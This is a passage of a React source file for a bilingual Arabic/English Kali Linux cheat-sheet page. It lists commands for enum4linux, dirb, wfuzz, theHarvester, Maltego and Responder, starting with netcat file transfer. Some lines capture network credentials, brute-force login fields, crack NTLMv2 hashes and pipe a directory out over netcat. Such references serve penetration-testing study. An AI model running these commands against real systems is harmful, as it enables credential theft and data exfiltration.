      { command: "nc -l 4444 | tar xvf -", description: { ar: "استقبال وفك ضغط", en: "Receive and extract" } },
      { command: "tar cf - . | nc 192.168.1.1 4444", description: { ar: "ضغط وإرسال", en: "Compress and send" } },
    ],
  },
  {
    name: "Enum4linux",
    description: { ar: "أداة استطلاع Windows/Samba", en: "Windows/Samba enumeration tool" },
    commands: [
      { command: "enum4linux -a 192.168.1.1", description: { ar: "استطلاع شامل", en: "Full enumeration" } },
      { command: "enum4linux -U 192.168.1.1", description: { ar: "استخراج المستخدمين", en: "Extract users" } },
      { command: "enum4linux -S 192.168.1.1", description: { ar: "استخراج المشاركات", en: "Extract shares" } },
      { command: "enum4linux -G 192.168.1.1", description: { ar: "استخراج المجموعات", en: "Extract groups" } },
      { command: "enum4linux -P 192.168.1.1", description: { ar: "سياسة كلمات المرور", en: "Password policy" } },
      { command: "enum4linux -o 192.168.1.1", description: { ar: "معلومات نظام التشغيل", en: "OS info" } },
      { command: "enum4linux -n 192.168.1.1", description: { ar: "جدول أسماء NetBIOS", en: "NetBIOS name table" } },
      { command: "enum4linux -M 192.168.1.1", description: { ar: "قائمة الأجهزة", en: "Machine list" } },
      { command: "enum4linux -r 192.168.1.1", description: { ar: "استخراج RID", en: "RID enumeration" } },
      { command: "enum4linux -u admin -p password 192.168.1.1", description: { ar: "استطلاع مع صلاحيات", en: "Authenticated enum" } },
      { command: "enum4linux -R 1000-2000 192.168.1.1", description: { ar: "نطاق RID مخصص", en: "Custom RID range" } },
      { command: "enum4linux -d 192.168.1.1", description: { ar: "تفاصيل إضافية", en: "Extra details" } },
      { command: "enum4linux -K 192.168.1.1", description: { ar: "استخدام Kerberos", en: "Use Kerberos" } },
      { command: "enum4linux -w DOMAIN 192.168.1.1", description: { ar: "تحديد الدومين", en: "Specify domain" } },
      { command: "enum4linux -l 192.168.1.1", description: { ar: "معلومات LDAP", en: "LDAP info" } },
      { command: "enum4linux -A 192.168.1.1", description: { ar: "استطلاع عدواني", en: "Aggressive enum" } },
      { command: "enum4linux -v 192.168.1.1", description: { ar: "وضع مفصل", en: "Verbose mode" } },
      { command: "enum4linux -s shares.txt 192.168.1.1", description: { ar: "فحص من قائمة", en: "Scan from list" } },
      { command: "enum4linux -I 192.168.1.1", description: { ar: "معلومات الطابعات", en: "Printer info" } },
      { command: "enum4linux -C 192.168.1.1", description: { ar: "تعليقات المشاركات", en: "Share comments" } },
    ],
  },
  {
    name: "Dirb",
    description: { ar: "أداة اكتشاف محتوى الويب", en: "Web content discovery tool" },
    commands: [
      { command: "dirb http://target.com", description: { ar: "فحص أساسي", en: "Basic scan" } },
      { command: "dirb http://target.com /usr/share/wordlists/dirb/big.txt", description: { ar: "قائمة كبيرة", en: "Big wordlist" } },
      { command: "dirb http://target.com -a 'Mozilla/5.0'", description: { ar: "تغيير User-Agent", en: "Custom User-Agent" } },
      { command: "dirb http://target.com -o output.txt", description: { ar: "حفظ النتائج", en: "Save results" } },
      { command: "dirb http://target.com -X .php,.html", description: { ar: "امتدادات محددة", en: "Specific extensions" } },
      { command: "dirb http://target.com -c 'PHPSESSID=abc123'", description: { ar: "استخدام كوكيز", en: "Use cookies" } },
      { command: "dirb http://target.com -u admin:password", description: { ar: "مصادقة HTTP", en: "HTTP auth" } },
      { command: "dirb http://target.com -p http://127.0.0.1:8080", description: { ar: "استخدام بروكسي", en: "Use proxy" } },
      { command: "dirb http://target.com -z 10", description: { ar: "تأخير 10 مللي ثانية", en: "10ms delay" } },
      { command: "dirb http://target.com -N 404", description: { ar: "تجاهل كود محدد", en: "Ignore specific code" } },
      { command: "dirb http://target.com -r", description: { ar: "عدم البحث العودي", en: "Non-recursive" } },
      { command: "dirb http://target.com -w", description: { ar: "تجاهل التحذيرات", en: "Ignore warnings" } },
      { command: "dirb http://target.com -S", description: { ar: "وضع صامت", en: "Silent mode" } },
      { command: "dirb http://target.com -f", description: { ar: "ضبط دقيق", en: "Fine tuning" } },
      { command: "dirb http://target.com -t", description: { ar: "عدم تفاعلي", en: "Non-interactive" } },
      { command: "dirb https://target.com", description: { ar: "فحص HTTPS", en: "HTTPS scan" } },
      { command: "dirb http://target.com:8080", description: { ar: "منفذ مخصص", en: "Custom port" } },
      { command: "dirb http://target.com -H 'X-Custom: value'", description: { ar: "رأس مخصص", en: "Custom header" } },
      { command: "dirb http://target.com -i", description: { ar: "بحث غير حساس للحالة", en: "Case insensitive" } },
      { command: "dirb http://target.com /usr/share/wordlists/common.txt -x extensions.txt", description: { ar: "ملف امتدادات", en: "Extensions file" } },
    ],
  },
  {
    name: "Wfuzz",
    description: { ar: "أداة Fuzzing لتطبيقات الويب", en: "Web application fuzzing tool" },
    commands: [
      { command: "wfuzz -c -z file,wordlist.txt http://target.com/FUZZ", description: { ar: "Fuzzing أساسي", en: "Basic fuzzing" } },
      { command: "wfuzz -c -z file,wordlist.txt --hc 404 http://target.com/FUZZ", description: { ar: "تجاهل 404", en: "Hide 404" } },
      { command: "wfuzz -c -z file,wordlist.txt -d 'user=admin&pass=FUZZ' http://target.com/login", description: { ar: "Fuzzing POST", en: "POST fuzzing" } },
      { command: "wfuzz -c -z range,1-100 http://target.com/page?id=FUZZ", description: { ar: "نطاق أرقام", en: "Number range" } },
      { command: "wfuzz -c -z file,wordlist.txt -H 'Cookie: session=FUZZ' http://target.com/", description: { ar: "Fuzzing الكوكيز", en: "Cookie fuzzing" } },
      { command: "wfuzz -c -z file,users.txt -z file,passwords.txt http://target.com/login?user=FUZ2Z&pass=FUZZ", description: { ar: "Fuzzing متعدد", en: "Multi fuzzing" } },
      { command: "wfuzz -c -z file,wordlist.txt --hl 0 http://target.com/FUZZ", description: { ar: "إخفاء ردود فارغة", en: "Hide empty responses" } },
      { command: "wfuzz -c -z file,wordlist.txt -b 'session=abc123' http://target.com/FUZZ", description: { ar: "استخدام كوكيز", en: "Use cookies" } },
      { command: "wfuzz -c -z file,wordlist.txt -p 127.0.0.1:8080 http://target.com/FUZZ", description: { ar: "استخدام بروكسي", en: "Use proxy" } },
      { command: "wfuzz -c -z file,wordlist.txt -t 50 http://target.com/FUZZ", description: { ar: "50 خيط", en: "50 threads" } },
      { command: "wfuzz -c -z file,wordlist.txt --sc 200 http://target.com/FUZZ", description: { ar: "عرض 200 فقط", en: "Show only 200" } },
      { command: "wfuzz -c -z file,wordlist.txt --sw 10 http://target.com/FUZZ", description: { ar: "عرض حسب عدد الكلمات", en: "Show by word count" } },
      { command: "wfuzz -c -z file,wordlist.txt -R 2 http://target.com/FUZZ", description: { ar: "عمق العودية 2", en: "Recursion depth 2" } },
      { command: "wfuzz -c -z file,wordlist.txt -L http://target.com/FUZZ", description: { ar: "تتبع إعادة التوجيه", en: "Follow redirects" } },
      { command: "wfuzz -c -z file,wordlist.txt --req-delay 1 http://target.com/FUZZ", description: { ar: "تأخير ثانية", en: "1 second delay" } },
      { command: "wfuzz -c -z file,wordlist.txt -o json http://target.com/FUZZ", description: { ar: "مخرجات JSON", en: "JSON output" } },
      { command: "wfuzz -e payloads", description: { ar: "عرض الحمولات المتاحة", en: "List payloads" } },
      { command: "wfuzz -c -z file,wordlist.txt --script=robots http://target.com/FUZZ", description: { ar: "استخدام سكربت", en: "Use script" } },
      { command: "wfuzz -c -z list,admin-config-backup http://target.com/FUZZ", description: { ar: "قائمة مباشرة", en: "Direct list" } },
      { command: "wfuzz -c -z file,wordlist.txt -f output.html,html http://target.com/FUZZ", description: { ar: "تقرير HTML", en: "HTML report" } },
    ],
  },
  {
    name: "theHarvester",
    description: { ar: "أداة جمع المعلومات والبريد الإلكتروني", en: "Email and info gathering tool" },
    commands: [
      { command: "theHarvester -d target.com -b google", description: { ar: "بحث Google", en: "Google search" } },
      { command: "theHarvester -d target.com -b all", description: { ar: "جميع المصادر", en: "All sources" } },
      { command: "theHarvester -d target.com -b linkedin", description: { ar: "بحث LinkedIn", en: "LinkedIn search" } },
      { command: "theHarvester -d target.com -b bing", description: { ar: "بحث Bing", en: "Bing search" } },
      { command: "theHarvester -d target.com -l 500", description: { ar: "500 نتيجة", en: "500 results" } },
      { command: "theHarvester -d target.com -b google -f report", description: { ar: "حفظ تقرير", en: "Save report" } },
      { command: "theHarvester -d target.com -b shodan", description: { ar: "بحث Shodan", en: "Shodan search" } },
      { command: "theHarvester -d target.com -b crtsh", description: { ar: "بحث الشهادات", en: "Certificate search" } },
      { command: "theHarvester -d target.com -b virustotal", description: { ar: "بحث VirusTotal", en: "VirusTotal search" } },
      { command: "theHarvester -d target.com -b hunter", description: { ar: "بحث Hunter.io", en: "Hunter.io search" } },
      { command: "theHarvester -d target.com -b dnsdumpster", description: { ar: "DNS Dumpster", en: "DNS Dumpster" } },
      { command: "theHarvester -d target.com -b github-code", description: { ar: "بحث GitHub", en: "GitHub search" } },
      { command: "theHarvester -d target.com -b yahoo", description: { ar: "بحث Yahoo", en: "Yahoo search" } },
      { command: "theHarvester -d target.com -b baidu", description: { ar: "بحث Baidu", en: "Baidu search" } },
      { command: "theHarvester -d target.com -n", description: { ar: "البحث عن DNS", en: "DNS lookup" } },
      { command: "theHarvester -d target.com -c", description: { ar: "البحث العميق", en: "Deep search" } },
      { command: "theHarvester -d target.com -v", description: { ar: "التحقق من المضيفين", en: "Verify hosts" } },
      { command: "theHarvester -d target.com -r", description: { ar: "البحث العكسي", en: "Reverse lookup" } },
      { command: "theHarvester -d target.com -s", description: { ar: "بداية النتائج", en: "Start result" } },
      { command: "theHarvester -d target.com -b google,bing,linkedin", description: { ar: "مصادر متعددة", en: "Multiple sources" } },
    ],
  },
  {
    name: "Maltego",
    description: { ar: "أداة تحليل الروابط والاستطلاع", en: "Link analysis and recon tool" },
    commands: [
      { command: "maltego", description: { ar: "تشغيل Maltego", en: "Start Maltego" } },
      { command: "New Graph → Add Entity", description: { ar: "إضافة كيان جديد", en: "Add new entity" } },
      { command: "Entity → Domain → Run All Transforms", description: { ar: "تشغيل جميع التحويلات", en: "Run all transforms" } },
      { command: "Entity → Person → To Email Addresses", description: { ar: "استخراج البريد", en: "Extract emails" } },
      { command: "Entity → Domain → To DNS Names", description: { ar: "أسماء DNS", en: "DNS names" } },
      { command: "Entity → IP → To Netblocks", description: { ar: "نطاقات الشبكة", en: "Netblocks" } },
      { command: "Entity → Email → To Person", description: { ar: "معلومات الشخص", en: "Person info" } },
      { command: "Entity → Phone Number → To Person", description: { ar: "ربط رقم بشخص", en: "Link phone to person" } },
      { command: "Entity → Website → To IP", description: { ar: "IP الموقع", en: "Website IP" } },
      { command: "Entity → Company → To Domains", description: { ar: "نطاقات الشركة", en: "Company domains" } },
      { command: "View → Graph Layout → Organic", description: { ar: "تخطيط عضوي", en: "Organic layout" } },
      { command: "View → Graph Layout → Hierarchical", description: { ar: "تخطيط هرمي", en: "Hierarchical layout" } },
      { command: "File → Export → As Image", description: { ar: "تصدير كصورة", en: "Export as image" } },
      { command: "File → Export → As Report", description: { ar: "تصدير كتقرير", en: "Export as report" } },
      { command: "Transform Hub → Install", description: { ar: "تثبيت تحويلات", en: "Install transforms" } },
      { command: "Settings → API Keys", description: { ar: "إعداد مفاتيح API", en: "Set API keys" } },
      { command: "Entity → Social Network → To Profile", description: { ar: "ملفات التواصل", en: "Social profiles" } },
      { command: "Entity → Hash → To Malware", description: { ar: "تحليل البرمجيات الخبيثة", en: "Malware analysis" } },
      { command: "Entity → Location → To GPS", description: { ar: "إحداثيات GPS", en: "GPS coordinates" } },
      { command: "File → New Machine", description: { ar: "آلة جديدة", en: "New machine" } },
    ],
  },
  {
    name: "Responder",
    description: { ar: "أداة التقاط كلمات المرور في الشبكة", en: "Network password capture tool" },
    commands: [
      { command: "responder -I eth0", description: { ar: "الاستماع على الواجهة", en: "Listen on interface" } },
      { command: "responder -I eth0 -wrf", description: { ar: "وضع متقدم", en: "Advanced mode" } },
      { command: "responder -I eth0 --lm", description: { ar: "التقاط LM", en: "Capture LM" } },
      { command: "responder -I eth0 -b", description: { ar: "تعطيل NBNS", en: "Disable NBNS" } },
      { command: "responder -I eth0 -r", description: { ar: "تحليل NetBIOS", en: "NetBIOS analysis" } },
      { command: "responder -I eth0 -d", description: { ar: "تحليل DHCP", en: "DHCP analysis" } },
      { command: "responder -I eth0 -w", description: { ar: "خادم WPAD", en: "WPAD server" } },
      { command: "responder -I eth0 -F", description: { ar: "فرض WPAD", en: "Force WPAD" } },
      { command: "responder -I eth0 -P", description: { ar: "بروكسي WPAD", en: "WPAD proxy" } },
      { command: "responder -I eth0 -v", description: { ar: "وضع مفصل", en: "Verbose mode" } },
      { command: "responder -I eth0 --disable-ess", description: { ar: "تعطيل ESS", en: "Disable ESS" } },
      { command: "responder -I eth0 -e IP", description: { ar: "IP خارجي", en: "External IP" } },
      { command: "cat /usr/share/responder/logs/*", description: { ar: "عرض السجلات", en: "View logs" } },
      { command: "responder --version", description: { ar: "عرض الإصدار", en: "Show version" } },
      { command: "responder -I eth0 -A", description: { ar: "وضع التحليل فقط", en: "Analyze only mode" } },
      { command: "hashcat -m 5600 hash.txt wordlist.txt", description: { ar: "كسر NTLMv2", en: "Crack NTLMv2" } },
      { command: "responder -I eth0 --basic", description: { ar: "مصادقة أساسية", en: "Basic auth" } },
      { command: "responder -I eth0 --wredir", description: { ar: "إعادة توجيه WPAD", en: "WPAD redirect" } },
      { command: "responder -I eth0 --lldp", description: { ar: "LLDP Spoofing", en: "LLDP Spoofing" } },
      { command: "responder -I eth0 -i IP", description: { ar: "IP محدد", en: "Specific IP" } },
    ],
  },
];

const ToolsPage = () => {
  const [expandedTool, setExpandedTool] = useState<number | null>(0);
  const [copiedCommand, setCopiedCommand] = useState<string | null>(null);
  const [searchQuery, setSearchQuery] = useState("");
  const [language, setLanguage] = useState<"ar" | "en">("ar");

  const copyCommand = (command: string) => {
    navigator.clipboard.writeText(command);
    setCopiedCommand(command);
    setTimeout(() => setCopiedCommand(null), 2000);
  };

  const filteredTools = useMemo(() => {
    if (!searchQuery.trim()) return tools;
    const query = searchQuery.toLowerCase();
    return tools.filter(
      (tool) =>
        tool.name.toLowerCase().includes(query) ||
        tool.description.ar.includes(searchQuery) ||
        tool.description.en.toLowerCase().includes(query) ||
        tool.commands.some(
          (cmd) =>
            cmd.command.toLowerCase().includes(query) ||
            cmd.description.ar.includes(searchQuery) ||
            cmd.description.en.toLowerCase().includes(query)
        )
    );
  }, [searchQuery]);

  const totalCommands = tools.reduce((acc, tool) => acc + tool.commands.length, 0);

  const t = {
    title: language === "ar" ? "أدوات كالي لينكس" : "Kali Linux Tools",
    subtitle: language === "ar" 
      ? `${tools.length} أداة احترافية مع ${totalCommands} أمر` 
      : `${tools.length} professional tools with ${totalCommands} commands`,
    search: language === "ar" ? "ابحث عن أداة أو أمر..." : "Search for a tool or command...",
    commands: language === "ar" ? "أمر" : "commands",
  };

  return (
    <div className="min-h-screen bg-background">
      <Navbar />
      <main className="pt-24 pb-16">
        <div className="container mx-auto px-4">
          {/* Header */}
          <div className="text-center mb-12">
            <div className="flex justify-center mb-6">
              <div className="cyber-icon-box">
                <Terminal className="w-10 h-10 text-primary" />
              </div>
            </div>
            <div className="flex items-center justify-center gap-3 mb-4">
              <h1 className="text-4xl md:text-5xl font-bold text-primary text-glow">
                {t.title}
              </h1>
              <button
                onClick={() => setLanguage(prev => prev === "ar" ? "en" : "ar")}
                className="p-2 rounded-lg bg-secondary border border-border/50 hover:border-primary/50 transition-colors"
              >
                <Globe className="w-5 h-5 text-muted-foreground" />
              </button>
            </div>
            <p className="text-muted-foreground text-lg max-w-2xl mx-auto">{t.subtitle}</p>
          </div>

          {/* Search */}
          <div className="max-w-2xl mx-auto mb-10">
            <div className="relative">
              <Search className="absolute right-4 top-1/2 -translate-y-1/2 w-5 h-5 text-muted-foreground" />
              <input
                type="text"
                value={searchQuery}
                onChange={(e) => setSearchQuery(e.target.value)}
                placeholder={t.search}
                className="w-full px-4 py-3 pr-12 rounded-xl bg-secondary border border-border/50 text-foreground placeholder:text-muted-foreground focus:outline-none focus:border-primary/50 focus:ring-2 focus:ring-primary/20 transition-all"
                dir={language === "ar" ? "rtl" : "ltr"}
              />
            </div>
          </div>

          {/* Tools Grid */}
          <div className="max-w-6xl mx-auto space-y-4">
            {filteredTools.map((tool, index) => (
              <div key={index} className="cyber-card overflow-hidden">
                <button
                  onClick={() => setExpandedTool(expandedTool === index ? null : index)}
                  className="w-full p-5 flex items-center justify-between hover:bg-primary/5 transition-colors"
                >
                  <div className="flex items-center gap-4">
                    <div className="w-12 h-12 rounded-xl bg-primary/10 border border-primary/30 flex items-center justify-center">
                      {(() => {
                        const IconComponent = toolIcons[tool.name] || Terminal;
                        return <IconComponent className="w-6 h-6 text-primary" />;
                      })()}
                    </div>
                    <div className={language === "ar" ? "text-right" : "text-left"}>
                      <h3 className="text-xl font-bold text-primary">{tool.name}</h3>
                      <p className="text-muted-foreground text-sm">
                        {language === "ar" ? tool.description.ar : tool.description.en}
                      </p>
                    </div>
                  </div>
                  <div className="flex items-center gap-3">
                    <span className="text-muted-foreground text-sm">{tool.commands.length} {t.commands}</span>
                    {expandedTool === index ? (
                      <ChevronUp className="w-6 h-6 text-primary" />
                    ) : (
                      <ChevronDown className="w-6 h-6 text-muted-foreground" />
                    )}
                  </div>
                </button>

                {expandedTool === index && (
                  <div className="border-t border-border/30 p-4 grid grid-cols-1 md:grid-cols-2 gap-3 animate-fade-in">
                    {tool.commands.map((cmd, cmdIndex) => (
                      <div
                        key={cmdIndex}
                        className="flex items-start gap-3 p-3 rounded-xl bg-secondary/50 hover:bg-secondary/80 transition-colors group"
                      >
                        <span className="w-7 h-7 rounded-lg bg-primary/20 text-primary flex items-center justify-center font-bold text-xs flex-shrink-0">
                          {cmdIndex + 1}
                        </span>
                        <div className="flex-1 min-w-0">
                          <div className="flex items-center gap-2 mb-1">
                            <code className="text-primary text-xs font-mono bg-background/50 px-2 py-0.5 rounded break-all" dir="ltr">
                              {cmd.command}
                            </code>
                            <button
                              onClick={() => copyCommand(cmd.command)}
                              className="p-1 rounded hover:bg-primary/20 transition-colors opacity-0 group-hover:opacity-100 flex-shrink-0"
                            >
                              {copiedCommand === cmd.command ? (
                                <Check className="w-3 h-3 text-primary" />
                              ) : (
                                <Copy className="w-3 h-3 text-muted-foreground" />
                              )}
                            </button>
                          </div>
                          <p className="text-muted-foreground text-xs">
                            {language === "ar" ? cmd.description.ar : cmd.description.en}
                          </p>
                        </div>
                      </div>
                    ))}
                  </div>
                )}
              </div>
            ))}
          </div>
        </div>
      </main>
      <Footer />
    </div>
  );
};

export default ToolsPage;
